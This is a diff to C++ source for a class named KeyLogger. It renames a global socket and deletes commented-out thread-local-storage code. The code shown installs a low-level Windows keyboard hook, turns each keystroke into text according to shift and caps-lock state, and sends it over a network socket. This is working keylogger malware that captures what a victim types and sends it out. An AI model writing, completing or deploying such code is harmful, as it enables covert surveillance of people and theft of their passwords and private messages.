@@ -4,7 +4,7 @@ KeyLogger::KeyLogger() {}
 
 KeyLogger::~KeyLogger() {}
 
-SOCKET _sock;
+SOCKET _keyboardSock;
 
 bool isShiftOn{};
 bool isCtrlOn{};
@@ -44,7 +44,7 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 				if (!(isShiftOn ^ isCapsOn)) key_event += tolower(cur_char);
 				else key_event += cur_char;
 			}
-
+		
 			//Speical chars
 			switch (code)
 			{
@@ -249,35 +249,14 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 	}
 
-	/*lpvData = TlsGetValue(dwTlsIndex);
-	SOCKET* sock = ((SOCKET*)lpvData);*/
-
 	std::cout << key_event;
-	send(_sock, key_event.c_str(), key_event.length(), 0);
+	send(_keyboardSock, key_event.c_str(), key_event.length(), 0);
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 void KeyLogger::recordKeyboard(SOCKET sock)
 {
-	_sock = sock;
-	/*if ((dwTlsIndex = TlsAlloc()) == TLS_OUT_OF_INDEXES)
-	{
-		std::cout << "TlsSetValue error";
-		_exit(1);
-	}
-
-
-	lpvData = (LPVOID)LocalAlloc(sock, 256);
-	if (!TlsSetValue(dwTlsIndex, lpvData))
-	{
-		std::cout << "TlsSetValue error";
-		_exit(1);
-	}
-
-	printf("thread %d: lpvData=%lx\n", GetCurrentThreadId(), lpvData);
-
-	if (lpvData != 0)
-		LocalFree((HLOCAL)lpvData);*/
+	_keyboardSock = sock;
 
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::startListen, 0, 0);
 	MSG msg;
